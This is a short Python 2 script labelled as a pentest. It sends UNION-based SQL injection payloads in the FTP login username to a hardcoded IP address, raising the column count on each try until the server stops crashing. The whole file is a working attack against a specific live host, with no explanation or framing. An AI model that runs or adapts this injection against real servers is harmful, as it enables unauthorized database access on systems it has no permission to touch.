#!/usr/bin/python
#script pentest  

from ftplib import FTP
import sys

for i in range(1,10):
	login = "root')/** /union/**/" ','.join(["1" for __ in range(i)]) + "/""from/**/information_schema.tables;#"
	password = '1'
	
	ftp = FTP( '37.59.43.156')
	try :
		ftp.login(login, password)
		
	except EOFError:
		print "Failed union with {0} columns".format(i)
		continue
	else:
		print "Directory with name '{0} columns".format(i)
		print "No crash with username '{0}'".format(login)
		ftp.quit()
		break
	print "done"
